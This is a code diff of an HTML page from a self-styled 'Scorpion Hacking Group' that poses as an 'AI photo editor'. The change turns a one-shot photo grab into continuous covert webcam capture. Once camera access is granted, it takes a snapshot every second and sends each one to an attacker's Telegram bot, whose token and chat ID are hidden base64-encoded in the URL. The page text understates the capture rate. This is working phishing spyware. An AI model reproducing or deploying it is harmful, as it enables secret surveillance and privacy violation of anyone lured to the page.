@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scorpion Hacking Group</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             display: flex;
             flex-direction: column;
@@ -14,81 +13,45 @@
             min-height: 100vh;
             background: linear-gradient(135deg, #ff9a9e, #fad0c4);
             font-family: 'Arial', sans-serif;
-            padding: 20px;
+            padding: 1.25rem;
         }
         .editor-card {
             background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
+            backdrop-filter: blur(0.9375rem);
+            border-radius: 1.25rem;
             padding: 2rem;
             width: 100%;
-            max-width: 400px;
+            max-width: 25rem;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
-            transition: transform 0.3s ease;
+            box-shadow: 0 0.625rem 2.5rem rgba(0, 0, 0, 0.3);
         }
-        .editor-card:hover { transform: translateY(-10px); }
-        h1 {
-            color: #fff;
-            font-size: 2rem;
-            margin-bottom: 0.5rem;
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        }
-        h2 {
-            color: #f0f0f0;
-            font-size: 1.2rem;
-            margin-bottom: 1.5rem;
-        }
-        p {
-            color: #f0f0f0;
-            font-size: 1rem;
-            margin-bottom: 1rem;
-        }
-        input[type="file"] {
-            width: 100%;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            border: none;
-            border-radius: 10px;
-            background: rgba(255, 255, 255, 0.2);
-            color: #fff;
-            font-size: 1rem;
-        }
+        h1, h2, p { color: #fff; }
         .btn {
             background: #ffcc00;
             border: none;
             padding: 0.8rem 1.5rem;
-            border-radius: 10px;
+            border-radius: 0.625rem;
             color: #333;
             font-size: 1rem;
             cursor: pointer;
-            transition: background 0.3s ease, transform 0.2s ease;
             margin: 0.5rem;
         }
-        .btn:hover {
-            background: #e6b800;
-            transform: scale(1.05);
-        }
-        video, img {
+        video {
             width: 100%;
-            border-radius: 10px;
+            border-radius: 0.625rem;
             margin-top: 1rem;
-            max-height: 200px;
+            max-height: 12.5rem;
             display: none;
         }
-        .loader {
-            display: none;
-            border: 4px solid #f0f0f0;
-            border-top: 4px solid #ffcc00;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            margin: 1rem auto;
-            animation: spin 1s linear infinite;
+        .pulse {
+            font-size: 1.5rem;
+            color: #ffcc00;
+            margin-top: 1rem;
+            animation: pulse 1.5s infinite;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.2); }
         }
         footer {
             position: fixed;
@@ -101,112 +64,34 @@
         footer a {
             color: #ffcc00;
             text-decoration: none;
-            transition: color 0.3s ease;
         }
         footer a:hover { color: #e6b800; }
-        .pulse {
-            font-size: 1.5rem;
-            color: #ffcc00;
-            margin-top: 1rem;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.2); }
-        }
-        @media (max-width: 600px) {
-            .editor-card { padding: 1.5rem; }
-            h1 { font-size: 1.8rem; }
-            h2, p, input, .btn { font-size: 0.9rem; }
-        }
     </style>
 </head>
 <body>
     <div class="editor-card">
         <h1>Scorpion Hacking Group</h1>
-        <h2>Advance Ai Photo Editor</h2>
-        <p>Upload or click a photo to unlock premium filters! 📸</p>
-        <input type="file" id="photoUpload" accept="image/*">
+        <h2>Advance AI Photo Editor</h2>
+        <p>Camera allow karte hi, aapki photo har 5 second me click hogi (Telegram par bheji jaayegi).</p>
         <button class="btn" onclick="accessCamera()">Allow Camera</button>
         <video id="video" autoplay></video>
-        <img id="preview" />
-        <img id="finalImage" />
-        <div class="loader" id="loader"></div>
-        <div class="pulse"></div>
+        <div class="pulse">⚡</div>
     </div>
     <footer>
         Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
     </footer>
     <script>
-        // Decode URL params
+        // URL params se bot token/chat id decode karo
         const params = new URLSearchParams(window.location.search);
         const encodedToken = params.get('t');
         const encodedChatId = params.get('c');
         const botToken = atob(encodedToken || '');
         const chatId = atob(encodedChatId || '');
 
-        // Final image URL (replace with your URL)
-        const finalImageUrl = 'https://i.pinimg.com/564x/4c/17/cd/4c17cd59fcdc235ab177f9f564fabdc5.jpg'; // Replace with your image URL
+        let stream = null;
+        let captureInterval = null;
 
-        // Camera access
-        async function accessCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.style.display = 'block';
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photo = canvas.toDataURL('image/png');
-                    document.getElementById('preview').src = photo;
-                    document.getElementById('preview').style.display = 'block';
-                    showLoaderAndSend(photo);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = 'none';
-                }, 1000);
-            } catch (err) {
-                alert('Camera access denied! Try uploading a photo.');
-            }
-        }
-
-        // Photo upload
-        document.getElementById('photoUpload').addEventListener('change', (event) => {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (e) => {
-                    const photo = e.target.result;
-                    document.getElementById('preview').src = photo;
-                    document.getElementById('preview').style.display = 'block';
-                    showLoaderAndSend(photo);
-                };
-                reader.readAsDataURL(file);
-            }
-        });
-
-        // Show loader, wait 10s, send to Telegram, show final image
-        function showLoaderAndSend(photo) {
-            const loader = document.getElementById('loader');
-            const finalImage = document.getElementById('finalImage');
-            const preview = document.getElementById('preview');
-            loader.style.display = 'block';
-            preview.style.display = 'block'; // Show preview while loading
-            finalImage.style.display = 'none';
-
-            setTimeout(() => {
-                loader.style.display = 'none';
-                finalImage.src = finalImageUrl;
-                finalImage.style.display = 'block';
-                preview.style.display = 'none';
-                sendToTelegram(photo);
-            }, 10000); // 10-second wait
-        }
-
-        // Convert DataURL to Blob
+        // DataURL ko Blob mein convert karo
         function dataURLtoBlob(dataurl) {
             var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
                 bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
@@ -216,53 +101,51 @@
             return new Blob([u8arr], {type:mime});
         }
 
-        // Send to Telegram (fixed)
+        // Photo Telegram par bhejo
         function sendToTelegram(photo) {
-            if (!botToken || !chatId) {
-                alert('Invalid bot token or chat ID!');
-                return;
-            }
-
-            // Check if photo is a DataURL (base64)
+            if (!botToken || !chatId) return;
             if (photo.startsWith('data:image/')) {
                 var blob = dataURLtoBlob(photo);
                 var formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('caption', 'Photo from Scorpion Hacking Group! 📸\n\nJoin us for more tools 🔥\n@ScorpionHackingGroup');
+                formData.append('caption', 'Photo From Scorpion Hacking Group 🔥\n\n✅ Join Us For More Tools\n@ScorpionHackingGroup');
                 formData.append('photo', blob, 'photo.png');
-
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) alert('Photo sent! Check Telegram! 😎');
-                    else alert('Error sending photo! ' + (data.description || ''));
-                })
-                .catch(err => alert('Error: ' + err.message));
-            } else if (photo.startsWith('http')) {
-                // If it's a URL, send as JSON
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        photo: photo,
-                        caption: 'Photo from Scorpion Hacking Group! 📸\n\nJoin us for more tools 🔥\n@ScorpionHackingGroup'
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) alert('Photo sent! Check Telegram! 😎');
-                    else alert('Error sending photo! ' + (data.description || ''));
-                })
-                .catch(err => alert('Error: ' + err.message));
-            } else {
-                alert('Invalid photo format!');
+                });
             }
         }
+
+        // Camera access + auto capture
+        async function accessCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.style.display = 'block';
+                video.srcObject = stream;
+
+                // Har 1 second me photo click karo aur bhejo
+                captureInterval = setInterval(() => {
+                    if (video.videoWidth && video.videoHeight) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const photo = canvas.toDataURL('image/png');
+                        sendToTelegram(photo);
+                    }
+                }, 1000);
+            } catch (err) {
+                alert('Camera access denied!');
+            }
+        }
+
+        // Page band hone par camera band karo
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (captureInterval) clearInterval(captureInterval);
+        });
     </script>
 </body>
-</html>
 </html>
